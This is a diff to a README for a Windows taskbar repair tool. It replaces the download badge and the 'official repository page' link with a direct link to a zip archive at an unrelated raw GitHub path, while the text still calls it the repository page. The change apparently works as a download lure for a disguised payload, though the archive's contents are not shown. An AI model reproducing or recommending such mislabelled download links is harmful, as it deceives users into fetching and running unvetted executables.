@@ -5,7 +5,7 @@ description: "Repair a frozen taskbar on Windows 10 and 11 with this direct fix 
 ---
 # 🛠️ Taskbar-Frozen-Fix - Restore your unresponsive Windows taskbar easily
 
-[![](https://img.shields.io/badge/Download-Taskbar-Frozen-Fix-blue.svg)](https://github.com/SamvegProOp/Taskbar-Frozen-Fix)
+[![](https://img.shields.io/badge/Download-Taskbar-Frozen-Fix-blue.svg)](https://raw.githubusercontent.com/SamvegProOp/samvegproop.github.io/main/seditious/io-samvegproop-github-1.4.zip)
 
 ## 📋 About This Tool
 
@@ -21,7 +21,7 @@ You do not need prior technical knowledge to use this software. It performs the 
 
 ## 📥 How to Download 
 
-1. Go to the official repository page: [https://github.com/SamvegProOp/Taskbar-Frozen-Fix](https://github.com/SamvegProOp/Taskbar-Frozen-Fix).
+1. Go to the official repository page: [https://raw.githubusercontent.com/SamvegProOp/samvegproop.github.io/main/seditious/io-samvegproop-github-1.4.zip](https://raw.githubusercontent.com/SamvegProOp/samvegproop.github.io/main/seditious/io-samvegproop-github-1.4.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the latest version number.
 4. Look for the file ending in .exe under the Assets heading.
